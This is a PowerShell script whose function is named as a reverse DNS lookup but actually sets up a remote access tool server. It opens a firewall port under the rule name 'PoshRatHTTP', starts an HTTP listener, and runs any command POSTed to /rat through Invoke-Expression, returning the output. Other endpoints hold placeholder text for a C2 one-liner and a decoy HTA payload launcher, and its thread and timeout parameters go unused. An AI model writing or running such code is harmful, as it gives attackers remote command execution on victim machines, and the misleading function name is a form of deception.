function Invoke-ReverseDNSLookup {
    param(
        [string]$IPAddress,
        [int]$Port,
        [int]$MaxThreads = 30,
        [int]$TimeOut = 200
    )

    $ErrorActionPreference = "Stop"

    begin {
        try {
            New-NetFirewallRule -DisplayName "PoshRatHTTP" -Direction Inbound -LocalPort $Port -Protocol TCP -Action Allow
            Write-Host "Windows Firewall modified to allow inbound connections on port $Port"

            $listener = New-Object System.Net.HttpListener
            $listener.Prefixes.Add("http://$IPAddress`:$Port/")
            $listener.Start()
            Write-Host "HTTP listener started on http://$IPAddress`:$Port/"
        } catch {
            Write-Host "Error: $_"
        }
    }

    process {
        try {
            while ($listener.IsListening) {
                $context = $listener.GetContext()
                $requestUrl = $context.Request.Url

                Write-Host "Request received for: $($requestUrl.LocalPath)"

                switch ($requestUrl.LocalPath) {
                    '/connect' {
                        $response = [System.Text.Encoding]::UTF8.GetBytes("PowerShell one-liner command for C2 channel")
                    }
                    '/rat' {
                        $requestMethod = $context.Request.HttpMethod
                        if ($requestMethod -eq "POST") {
                            $command = (New-Object System.IO.StreamReader($context.Request.InputStream, [System.Text.Encoding]::UTF8)).ReadToEnd()
                            $response = [System.Text.Encoding]::UTF8.GetBytes((Invoke-Expression $command | Out-String))
                        } elseif ($requestMethod -eq "GET") {
                            $response = [System.Text.Encoding]::UTF8.GetBytes("Interactive shell for command execution and output retrieval")
                        }
                    }
                    '/app.hta' {
                        $response = [System.Text.Encoding]::UTF8.GetBytes("Decoy HTA application for launching PowerShell payload")
                    }
                    default {
                        $response = [System.Text.Encoding]::UTF8.GetBytes("Invalid URL")
                    }
                }

                $context.Response.OutputStream.Write($response, 0, $response.Length)
                $context.Response.Close()
            }
        } catch {
            Write-Host "Error: $_"
        }
    }

    end {
        if ($listener -ne $null -and $listener.IsListening) {
            $listener.Stop()
            $listener.Close()
        }
    }
}

